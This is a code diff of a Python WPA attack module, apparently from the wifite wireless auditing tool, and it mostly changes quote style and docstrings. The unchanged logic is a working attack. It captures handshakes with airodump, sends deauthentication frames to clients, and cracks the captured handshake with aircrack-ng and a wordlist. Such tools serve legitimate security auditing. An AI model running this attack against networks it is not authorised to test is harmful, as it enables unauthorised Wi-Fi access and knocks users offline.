@@ -24,11 +24,9 @@ class AttackWPA(Attack):
         self.success = False
 
     def run(self):
-        '''
-            Initiates full WPA handshake capture attack.
-        '''
+        '''Initiates full WPA handshake capture attack.'''
 
-        # Check if user only wants to run PixieDust attack
+        # Skip if user only wants to run PixieDust attack
         if Configuration.wps_only and self.target.wps:
             Color.pl('\r{!} {O}--wps-only{R} set, ignoring WPA-handshake attack on {O}%s{W}' % self.target.essid)
             self.success = False
@@ -56,8 +54,9 @@ class AttackWPA(Attack):
             self.success = True
         return self.success
 
+
     def capture_handshake(self):
-        ''' Returns captured or stored handshake, otherwise None '''
+        '''Returns captured or stored handshake, otherwise None.'''
         handshake = None
 
         # First, start Airodump process
@@ -67,7 +66,7 @@ class AttackWPA(Attack):
                       output_file_prefix='wpa') as airodump:
 
             Color.clear_entire_line()
-            Color.pattack("WPA", self.target, "Handshake capture", "Waiting for target to appear...")
+            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
             airodump_target = self.wait_for_target(airodump)
 
             self.clients = []
@@ -78,7 +77,7 @@ class AttackWPA(Attack):
                 essid = airodump_target.essid if airodump_target.essid_known else None
                 handshake = self.load_handshake(bssid=bssid, essid=essid)
                 if handshake:
-                    Color.pattack("WPA", self.target, "Handshake capture", "found {G}existing handshake{W} for {C}%s{W}" % handshake.essid)
+                    Color.pattack('WPA', self.target, 'Handshake capture', 'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                     Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                     return handshake
 
@@ -88,10 +87,10 @@ class AttackWPA(Attack):
             while handshake is None and not timeout_timer.ended():
                 step_timer = Timer(1)
                 Color.clear_entire_line()
-                Color.pattack("WPA",
+                Color.pattack('WPA',
                         airodump_target,
-                        "Handshake capture",
-                        "Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})" % (len(self.clients), deauth_timer, timeout_timer))
+                        'Handshake capture',
+                        'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (len(self.clients), deauth_timer, timeout_timer))
 
                 # Find .cap file
                 cap_files = airodump.find_files(endswith='.cap')
@@ -124,11 +123,11 @@ class AttackWPA(Attack):
                 for client in airodump_target.clients:
                     if client.station not in self.clients:
                         Color.clear_entire_line()
-                        Color.pattack("WPA",
+                        Color.pattack('WPA',
                                 airodump_target,
-                                "Handshake capture",
-                                "Discovered new client: {G}%s{W}" % client.station)
-                        Color.pl("")
+                                'Handshake capture',
+                                'Discovered new client: {G}%s{W}' % client.station)
+                        Color.pl('')
                         self.clients.append(client.station)
 
                 # Send deauth to a client or broadcast
@@ -143,7 +142,7 @@ class AttackWPA(Attack):
 
         if handshake is None:
             # No handshake, attack failed.
-            Color.pl("\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds" % (Configuration.wpa_attack_timeout))
+            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (Configuration.wpa_attack_timeout))
             return handshake
         else:
             # Save copy of handshake to ./hs/
@@ -153,34 +152,34 @@ class AttackWPA(Attack):
     def crack_handshake(self, handshake, wordlist):
         '''Tries to crack a handshake. Returns WPA key if found, otherwise None.'''
         if wordlist is None:
-            Color.pl("{!} {O}Not cracking handshake because" +
-                     " wordlist ({R}--dict{O}) is not set")
+            Color.pl('{!} {O}Not cracking handshake because' +
+                     ' wordlist ({R}--dict{O}) is not set')
             return None
         elif not os.path.exists(wordlist):
-            Color.pl("{!} {O}Not cracking handshake because" +
-                     " wordlist {R}%s{O} was not found" % wordlist)
+            Color.pl('{!} {O}Not cracking handshake because' +
+                     ' wordlist {R}%s{O} was not found' % wordlist)
             return None
 
-        Color.pl("\n{+} {C}Cracking WPA Handshake:{W} Using {C}aircrack-ng{W} via" +
-                " {C}%s{W} wordlist" % os.path.split(wordlist)[-1])
+        Color.pl('\n{+} {C}Cracking WPA Handshake:{W} Using {C}aircrack-ng{W} via' +
+                ' {C}%s{W} wordlist' % os.path.split(wordlist)[-1])
 
         key_file = Configuration.temp('wpakey.txt')
         command = [
-            "aircrack-ng",
-            "-a", "2",
-            "-w", wordlist,
-            "--bssid", handshake.bssid,
-            "-l", key_file,
+            'aircrack-ng',
+            '-a', '2',
+            '-w', wordlist,
+            '--bssid', handshake.bssid,
+            '-l', key_file,
             handshake.capfile
         ]
         crack_proc = Process(command)
 
         # Report progress of cracking
-        aircrack_nums_re = re.compile(r"(\d+)/(\d+) keys tested.*\(([\d.]+)\s+k/s")
-        aircrack_key_re  = re.compile(r"Current passphrase:\s*([^\s].*[^\s])\s*$")
+        aircrack_nums_re = re.compile(r'(\d+)/(\d+) keys tested.*\(([\d.]+)\s+k/s')
+        aircrack_key_re  = re.compile(r'Current passphrase:\s*([^\s].*[^\s])\s*$')
         num_tried = num_total = 0
         percent = num_kps = 0.0
-        eta_str = "unknown"
+        eta_str = 'unknown'
         current_key = ''
         while crack_proc.poll() is None:
             line = crack_proc.pid.stdout.readline()
@@ -198,26 +197,26 @@ class AttackWPA(Attack):
             else:
                 continue
 
-            status = "\r{+} {C}Cracking WPA Handshake: %0.2f%%{W}" % percent
-            status += " ETA: {C}%s{W}" % eta_str
-            status += " @ {C}%0.1fkps{W}" % num_kps
-            #status += " ({C}%d{W}/{C}%d{W} keys)" % (num_tried, num_total)
-            status += " (current key: {C}%s{W})" % current_key
+            status = '\r{+} {C}Cracking WPA Handshake: %0.2f%%{W}' % percent
+            status += ' ETA: {C}%s{W}' % eta_str
+            status += ' @ {C}%0.1fkps{W}' % num_kps
+            #status += ' ({C}%d{W}/{C}%d{W} keys)' % (num_tried, num_total)
+            status += ' (current key: {C}%s{W})' % current_key
             Color.clear_entire_line()
             Color.p(status)
 
-        Color.pl("")
+        Color.pl('')
         # Check crack result
         if os.path.exists(key_file):
-            with open(key_file, "r") as fid:
+            with open(key_file, 'r') as fid:
                 key = fid.read().strip()
             os.remove(key_file)
 
-            Color.pl("{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n" % key)
+            Color.pl('{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n' % key)
             return key
         else:
-            Color.pl("{!} {R}Failed to crack handshake:" +
-                     " {O}%s{R} did not contain password{W}" % wordlist.split(os.sep)[-1])
+            Color.pl('{!} {R}Failed to crack handshake:' +
+                     ' {O}%s{R} did not contain password{W}' % wordlist.split(os.sep)[-1])
             return None
 
     def load_handshake(self, bssid, essid):
@@ -260,7 +259,7 @@ class AttackWPA(Attack):
         cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)
 
         if Configuration.wpa_strip_handshake:
-            Color.p("{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}..." % cap_filename)
+            Color.p('{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}...' % cap_filename)
             handshake.strip(outfile=cap_filename)
             Color.pl('{G}saved{W}')
         else:
@@ -282,25 +281,25 @@ class AttackWPA(Attack):
 
         for index, client in enumerate([None] + self.clients):
             if client is None:
-                target_name = "*broadcast*"
+                target_name = '*broadcast*'
             else:
                 target_name = client
             Color.clear_entire_line()
-            Color.pattack("WPA",
+            Color.pattack('WPA',
                     target,
-                    "Handshake capture",
-                    "Deauthing {O}%s{W}" % target_name)
+                    'Handshake capture',
+                    'Deauthing {O}%s{W}' % target_name)
             Aireplay.deauth(target.bssid, client_mac=client, timeout=2)
 
 if __name__ == '__main__':
     Configuration.initialize(True)
     from ..model.target import Target
-    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
+    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
     target = Target(fields)
     wpa = AttackWPA(target)
     try:
         wpa.run()
     except KeyboardInterrupt:
-        Color.pl("")
+        Color.pl('')
         pass
     Configuration.exit_gracefully(0)
